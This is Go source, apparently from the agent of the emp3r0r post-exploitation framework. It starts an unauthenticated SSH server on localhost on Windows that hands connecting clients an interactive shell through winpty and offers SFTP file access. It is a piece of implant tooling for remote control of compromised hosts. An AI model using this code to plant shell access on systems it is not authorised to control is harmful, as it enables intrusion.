//go:build windows
// +build windows

package agent

import (
	"context"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/gliderlabs/ssh"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/jm33-m0/go-console"
	"golang.org/x/sys/windows"
)

// SSHD start a ssh server to provide shell access for clients
// the server binds local interface only
func crossPlatformSSHD(shell, port string, args []string) (err error) {
	exe, e := exec.LookPath(shell)
	if e != nil {
		e = fmt.Errorf("%s not found (%v)", shell, e)
		log.Print(e)
		return
	}
	if shell == "elvsh" {
		exe = util.ProcExePath(os.Getpid())
	}

	// ssh server
	ssh_server := ssh.Server{
		Addr: "127.0.0.1:" + port,
		SubsystemHandlers: map[string]ssh.SubsystemHandler{
			"sftp": SftpHandler,
		},
	}

	log.Printf("Using %s shell", strconv.Quote(shell))

	ssh_server.Handle(func(s ssh.Session) {
		cmd := exec.Command(exe, args...)

		// Evlsh
		if shell == "elvsh" {
			os.Setenv("ELVSH", "true")
		}

		// remove empty arg in cmd.Args
		var tmp_args []string
		for _, arg := range cmd.Args {
			if strings.TrimSpace(arg) != "" {
				tmp_args = append(tmp_args, arg)
			}
		}
		cmd.Args = tmp_args
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		// console configs
		ptyReq, winCh, isPTY := s.Pty()
		if isPTY {
			log.Printf("Got an SSH PTY request: %s", ptyReq.Term)
			cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
		} else {
			log.Print("Got a non-PTY SSH request, might not work")
		}

		log.Printf("sshd execute: %v, args(%d)=%v, env=%s",
			cmd, len(cmd.Args), cmd.Args, cmd.Env)

		// use winpty PTY implementation if ConPTY is unsupported
		winpty_shell_proc, err := console.New(80, 20)
		if err != nil {
			err = fmt.Errorf("Creating new winpty console: %v\n", err)
			io.WriteString(s, err.Error())
			return
		}
		defer winpty_shell_proc.Close()
		resize_console := func() {
			win := <-winCh
			if win.Width <= 0 || win.Height <= 0 {
				time.Sleep(5 * time.Second)
				log.Printf("w/h is 0, aborting")
			}
			os.Setenv("TERM_SIZE", fmt.Sprintf("%dx%d", win.Width, win.Height))

			// winpty
			err = winpty_shell_proc.SetSize(win.Width, win.Height)
			if err != nil {
				log.Printf("Error resizing winpty console: %v", err)
			}
		}

		// resize console
		if isPTY {
			resize_console()
		}

		// start shell
		err = winpty_shell_proc.Start(cmd.Args)
		if err != nil {
			err = fmt.Errorf("start SSH shell %v: %v\n", cmd.Args, err)
			io.WriteString(s, err.Error())
			return
		} else {
			go func() {
				for ctx.Err() == nil {
					resize_console()
				}
			}()
		}

		// send console via SSH
		go func() {
			_, err = io.Copy(winpty_shell_proc, s)
			if err != nil {
				err = fmt.Errorf("io copy to winpty: %v\n", err)
				io.WriteString(s, err.Error())
				return
			}
		}()
		_, err = io.Copy(s, winpty_shell_proc)
		if err != nil {
			err = fmt.Errorf("io copy to SSH: %v\n", err)
			io.WriteString(s, err.Error())
			return
		}

		// wait shell process so we can clean it up
		_, err = winpty_shell_proc.Wait()
		if err != nil {
			err = fmt.Errorf("Wait winpty shell: %v\n", err)
			io.WriteString(s, err.Error())
			return
		}
	})

	log.Printf("Starting SSHD on port %s...", port)
	return ssh_server.ListenAndServe()
}

// test if ConPTY is implemented in current OS
func IsConPTYSupported() bool {
	k32dll, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
		return false
	}
	_, err = windows.GetProcAddress(k32dll, "CreatePseudoConsole")
	if err == nil {
		log.Printf("ConPTY is supported")
		return true
	}

	return false
}
